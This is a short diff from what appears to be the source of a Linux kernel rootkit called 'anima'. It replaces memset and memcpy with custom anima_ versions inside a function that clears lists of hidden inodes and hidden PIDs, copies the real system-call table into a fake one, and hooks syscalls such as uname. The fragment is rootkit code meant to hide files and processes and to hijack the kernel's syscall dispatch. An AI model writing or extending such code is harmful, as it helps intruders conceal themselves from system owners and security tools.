@@ -10,6 +10,7 @@
 #include <anima/config.h>
 #include <anima/debug.h>
 #include <anima/ksyms.h>
+#include <anima/libc.h>
 #include <anima/uaccess.h>
 #include <anima/structs.h>
 #include <anima/syscalls.h>
@@ -629,9 +630,9 @@ void ia32_system_call_hook(struct pt_regs *regs)
 
 int hook_sys_call_table(void)
 {
-	memset(hidden_inodes, 0, ARRAY_SIZE(hidden_inodes));
-	memset(hidden_pids, 0, ARRAY_SIZE(hidden_pids));
-	memcpy(fake_sct, (void *)ksyms.sys_call_table, sizeof(fake_sct));
+	anima_memset(hidden_inodes, 0, ARRAY_SIZE(hidden_inodes));
+	anima_memset(hidden_pids, 0, ARRAY_SIZE(hidden_pids));
+	anima_memcpy(fake_sct, (void *)ksyms.sys_call_table, sizeof(fake_sct));
 
 	HOOK(uname, new_sys_newuname);
 
